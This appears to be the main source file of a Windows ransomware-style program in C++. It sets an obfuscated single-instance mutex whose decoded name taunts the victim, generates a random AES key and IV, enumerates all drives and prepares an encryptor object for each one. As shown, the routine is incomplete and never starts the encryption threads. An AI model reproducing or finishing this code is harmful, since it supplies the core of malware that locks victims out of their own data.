#include <iostream>
#include <thread>
#include <iomanip>

#include <cryptopp/aes.h>
#include <cryptopp/osrng.h>


#include "headers.h"
#include "systeme.h"
#include "diskEncryptor.h"


int main(void) {

	HANDLE hMutex = CreateMutexA(NULL, TRUE, AY_OBFUSCATE("b29wc2llIHRoYXRzIHNhZCBmb3IgeW91IF5e"));
	if (ERROR_ALREADY_EXISTS == GetLastError()) {
		return 1;
	}

	CryptoPP::AutoSeededRandomPool prng;
	CryptoPP::SecByteBlock  key(CryptoPP::AES::DEFAULT_KEYLENGTH);
	CryptoPP::SecByteBlock  iv(CryptoPP::AES::BLOCKSIZE);

	prng.GenerateBlock(key.data(), sizeof(key));
	prng.GenerateBlock(iv.data(), sizeof(iv));

#if DEBUG
	std::clog << "0x" << &key << " Allocated Buffer :  key " << sizeof(key) << std::endl;
	std::clog << "0x" << &iv << " Allocated Buffer :  iv " << sizeof(iv) << std::endl;
#endif


	std::vector<std::thread> threads;
	std::vector<DiskEncryptor> toEncrypt;
	Systeme sys;
	std::vector<std::string> drives = sys.getDrives();


	for (std::string drive : drives) {
		DiskEncryptor diskEncryptor(drive, key, iv);
		toEncrypt.push_back(diskEncryptor);
	}

	


	
	return 0;
}